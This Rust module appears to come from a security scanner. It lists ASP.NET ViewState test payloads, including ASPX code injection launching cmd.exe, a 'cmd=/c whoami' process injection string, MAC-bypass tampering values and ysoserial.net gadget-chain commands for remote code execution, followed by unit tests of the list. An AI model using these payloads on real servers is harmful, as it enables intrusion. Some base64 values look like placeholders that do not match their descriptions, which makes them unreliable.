use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Viewstate,
        "detection", [
            ("__VIEWSTATE", "ViewState field name detection probe", Severity::Info),
            ("__VIEWSTATEGENERATOR", "ViewState generator detection probe", Severity::Info),
            ("__EVENTVALIDATION", "Event validation detection probe", Severity::Info),
            ("__VIEWSTATEENCRYPTED", "Encrypted ViewState detection probe", Severity::Info),
            ("/WebResource.axd", "ASP.NET script resource handler probe", Severity::Info),
        ];
        "deserialization", [
            ("/wEPDwUKLTIwMTkwNTExMTcKPGRhdGE+PGQ+PC9kPjxkPjwvZD48ZD48L2Q+PC9kPg==", "Basic base64 ViewState payload", Severity::Critical),
            ("AAEAAAD/////AQAAAAAAAAAMAgAAAEZTeXN0ZW0uRHJhdmluZy52Mig=", "Binary serialized ViewState with System.Drawing reference", Severity::Critical),
            ("<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\"); %>", "ASPX code injection via ViewState", Severity::Critical),
            ("type=System.Diagnostics.Process&cmd=/c whoami", "Process injection via deserialized type parameter", Severity::Critical),
            ("<LOSFormatter>", "LosFormatter serializer detection", Severity::High),
            ("<ObjectStateFormatter>", "ObjectStateFormatter serializer detection", Severity::High),
        ];
        "bypass", [
            ("__VIEWSTATE=&__VIEWSTATEGENERATOR=&__EVENTVALIDATION=", "Empty ViewState fields to test validation bypass", Severity::High),
            ("__VIEWSTATE=/wEPDwUKMTIzNA==", "Modified ViewState value for tampering test", Severity::High),
            ("__VIEWSTATEENCRYPTED=true", "Encrypted ViewState bypass attempt", Severity::High),
            ("__VIEWSTATE=/wEPDwUKLQo8KTwvUDpOPCo8Qz48UDpDPjs+Q3o8L1A6PjwvUDo+CjwvUDo+CjwvUDo+", "Padding byte manipulation to test MAC validation bypass", Severity::High),
            ("__VIEWSTATE=/wEpDwUKLTIwMTkwNTExMTcKZ2lkD0lECnVpZA1BZG1pbg==", "Algorithm confusion attack swapping HMAC keys between SHA1 and SHA256", Severity::Critical),
        ];
        "ysoserial", [
            ("ysoserial.net -g WindowsIdentity -f LosFormatter -c \"cmd.exe\"", "WindowsIdentity gadget chain for RCE via LosFormatter", Severity::Critical),
            ("ysoserial.net -g ActivitySurrogateSelector -f ObjectStateFormatter -c \"id\"", "ActivitySurrogateSelector gadget chain for code execution", Severity::Critical),
            ("ysoserial.net -g PSObject -f LosFormatter -c \"Get-Process\"", "PSObject gadget chain for PowerShell command execution", Severity::Critical),
            ("ysoserial.net -g TypeConfuseDelegate -f ObjectStateFormatter", "TypeConfuseDelegate gadget chain for type confusion attack", Severity::Critical),
            ("ysoserial.net -g MessageSurrogateSelector -f ObjectStateFormatter", "MessageSurrogateSelector gadget chain for deserialization RCE", Severity::Critical),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "ViewState payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_viewstate_type() {
        let payloads = get_payloads();
        for p in &payloads {
            assert_eq!(
                p.payload_type,
                PayloadType::Viewstate,
                "Payload has wrong type: {}",
                p.description
            );
        }
    }

    #[test]
    fn contains_detection_payloads() {
        let payloads = get_payloads();
        let detection: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"detection".to_string()))
            .collect();
        assert!(
            detection.len() >= 3,
            "Must have at least 3 detection payloads, got {}",
            detection.len()
        );
        let has_viewstate_field = detection.iter().any(|p| p.payload.contains("__VIEWSTATE"));
        assert!(
            has_viewstate_field,
            "Detection payloads must include __VIEWSTATE probe"
        );
    }

    #[test]
    fn contains_deserialization_payloads() {
        let payloads = get_payloads();
        let deser: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"deserialization".to_string()))
            .collect();
        assert!(
            deser.len() >= 3,
            "Must have at least 3 deserialization payloads, got {}",
            deser.len()
        );
        let has_los_formatter = deser.iter().any(|p| p.payload.contains("LOSFormatter"));
        assert!(
            has_los_formatter,
            "Deserialization payloads must include LosFormatter detection"
        );
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 12,
            "Must have at least 12 ViewState payloads, got {}",
            payloads.len()
        );
    }
}
